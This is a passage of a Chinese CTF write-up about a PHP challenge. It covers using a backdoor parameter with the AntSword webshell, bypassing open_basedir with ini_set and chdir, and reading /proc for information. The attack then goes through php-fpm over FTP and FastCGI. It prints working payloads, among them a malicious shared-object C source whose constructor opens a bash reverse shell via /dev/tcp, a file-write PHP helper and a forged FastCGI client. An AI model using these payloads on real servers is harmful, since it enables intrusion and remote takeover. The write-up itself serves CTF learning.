<p>[浅析PHP原生类 - 知乎 (zhihu.com)](<a href="https://zhuanlan.zhihu.com/p/458866772#:~:text=%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E9%85%8D%E5%90%88glob%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9D%A5%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95">https://zhuanlan.zhihu.com/p/458866772#:~:text=可以直接配合glob伪协议来读取目录</a> 下面看一下效果图,这种姿势也可以无视open_basedir的限制 并且从图中就可以看出这两个原生类的些许区别了，Filesystemlterator会以绝路路径的形式展现，而DirectoryIterator仅显示出当前目录下的文件信息)</p>
<p>已经可以eval了 直接连一下蚁剑 这里可能会有问题 为什么hackbar发送的是assert 而蚁剑还能用eval连接 assert我们知道就是执行php代码 eval也是  核心部分是可控的post参数 所以只要可以执行这个参数就可以</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220425161106882.png" alt="image-20220425161106882"></p>
<p>蚁剑连接的时候别忘了设置一下cookie</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220425161133422.png" alt="image-20220425161133422"></p>
<p>在根目录下找到flag 但是发现是空的 原因是php ini中设置了open basedir 限制了我们的访问 可以在phpinfo中看到</p>
<p>也就是说我们可访问的范围只有/var/www/html 但如果在www下有一个叫html1的也是可以访问的 因为openbasedir筛选的是路径的前缀 具体的移步上面的学习链接</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220425162432733.png" alt="image-20220425162432733"></p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220425162515210.png" alt="image-20220425162515210"></p>
<p>使用glob伪协议绕过 写一段脚本上传</p>
<p>w3这里有opendir的例子 正好可以拿来用 在路径前面加个伪协议就行了</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220425164747436.png" alt="image-20220425164747436"></p>
<p>上传并访问 修改路径后还是读取不了flag 换一种方式绕过</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220425164816700.png" alt="image-20220425164816700"></p>
<p>用set_ini和chdir()进行绕过    payload是这样的</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">/add_api.php?backdoor=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;y1zh3e7&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;y1zh3e7&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我看了很多大佬的解释都有点迷 自己总结了一下</p>
<p>**set_ini 和chdir() 绕过open_basedir: **</p>
<p>先举个例子 比如我现在在 /var/www/html下</p>
<p>1.如果openbasedir限制的目录是我们现在所在目录 就要在该目录下新建一个子目录 </p>
<p>所以有了mkdir(‘y1zh3e7’) 并切换到这个子目录   </p>
<p>当前目录：/var/www/html/y1zh3e7       open_basedir限制目录：/var/www/html</p>
<p>2.通过ini_set修改open_basedir的参数 可以看到上面将限制目录修改成了相对上一级目录 </p>
<p>当前目录：/var/www/html/y1zh3e7       open_basedir限制目录：/var/www/html</p>
<p>3.通过chdir返回上一级目录 </p>
<p>当前目录：/var/www/html       open_basedir限制目录：/var/www</p>
<p>4.再返回一级</p>
<p>当前目录：/var/www       open_basedir限制目录：/var</p>
<p>5.再返回一级目录</p>
<p>当前目录：/var      open_basedir限制目录：/</p>
<p>成功拿到查看根目录的权限 其实再返回几次也是可以的  因为根目录再往上一级还是根目录</p>
<p><img src="https://s2.loli.net/2022/04/27/cY843SLql2wUOVG.png" alt="image-20220427095928253"></p>
<h3 id="第三个点-linux系统下的信息泄露-proc"><a href="#第三个点-linux系统下的信息泄露-proc" class="headerlink" title="第三个点 linux系统下的信息泄露 proc"></a>第三个点 linux系统下的信息泄露 proc</h3><p>这里更换路径为flag 还是不能读取  这里涉及到了关于proc的知识 放个连接 再补充一下</p>
<p><a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">1.cmdline(文件)</span><br><span class="line">	cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令</span><br><span class="line">我们可以使用爆破file_get_contents(&#x27;/proc/§§/cmdline&#x27;);的方法得到全部当前执行的程序</span><br><span class="line">2.cwd(目录软链接)</span><br><span class="line">	cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录(就是一个目录的软链接)</span><br><span class="line">3.exe(当前进程的可执行文件)</span><br><span class="line">	exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</span><br><span class="line">4.environ(文件)</span><br><span class="line">	environ文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息：</span><br><span class="line">5.fd</span><br><span class="line">	fd是一个目录，里面包含着当前进程打开的每一个文件的描述符（file descriptor）差不多就是路径啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容</span><br><span class="line">6.maps(文件)</span><br><span class="line">	/proc/meminfo可以看到整个系统内存消耗情况,基于里面信息能大概判断泄露的内存的属性，是哪个区域在泄漏、对应哪个文件。辅助工具procmem输出更可读的maps信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用self 和 proc拿到提示 在题目环境开启时启动了fpm 回到phpinfo也有相关信息 关于php-fpm 以及 fast-cgi移步我的另一篇博客</p>
<p><a href="https://y1zh3e7.github.io/2022/04/26/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86-CGI/">动态网页基础原理-CGI - y1zh3e7</a></p>
<p><img src="https://s2.loli.net/2022/04/27/RJSPjwWomAr1lXd.png" alt="image-20220427102838855"></p>
<p><img src="https://s2.loli.net/2022/04/27/V9quFbCNocWZw4n.png" alt="image-20220427102512492">、</p>
<p>接下来就有两个办法了 通过访问/proc/self/maps 可以发现一个bypass的so文件 会pwn的师傅可以下载下来pwn一下 </p>
<p><img src="https://s2.loli.net/2022/04/27/gjoc4dmuQUYnNyS.png" alt="image-20220427103252380"></p>
<p>不会pwn的话就用FTP协议打fpm的方式进行绕过</p>
<h3 id="第四个点-FTP协议打php-fpm"><a href="#第四个点-FTP协议打php-fpm" class="headerlink" title="第四个点 FTP协议打php-fpm"></a>第四个点 FTP协议打php-fpm</h3><p>放个P牛链接 </p>
<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌 (leavesongs.com)</a></p>
<p>连接蚁剑</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207122325821.png" alt="image-20220712232549715"></p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207122326715.png" alt="image-20220712232610672"></p>
<p>上传恶意so文件 c源码如下 自己改ip和端口</p>
<figure class="highlight c"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译后用蚁剑上传so文件</p>
<p>再写一个接受数据用的y1.php脚本并上传</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;/tmp/file&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$file</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>伪造恶意fastcgi请求</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">VERSION_1</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">BEGIN_REQUEST</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ABORT_REQUEST</span>        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">END_REQUEST</span>          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PARAMS</span>               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDIN</span>                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDOUT</span>               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDERR</span>               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DATA</span>                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES</span>           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES_RESULT</span>    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_TYPE</span>         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAXTYPE</span>              = <span class="built_in">self</span>::<span class="variable constant_">UNKNOWN_TYPE</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">RESPONDER</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AUTHORIZER</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FILTER</span>               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">REQUEST_COMPLETE</span>     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">CANT_MPX_CONN</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OVERLOADED</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_ROLE</span>         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_CONNS</span>            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_REQS</span>             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MPXS_CONNS</span>           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">HEADER_LEN</span>           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_keepAlive &amp;&amp; <span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_sock = <span class="title function_ invoke__">stream_socket_client</span>(<span class="variable">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">chr</span>(<span class="built_in">self</span>::<span class="variable constant_">VERSION_1</span>)         <span class="comment">/* version */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span 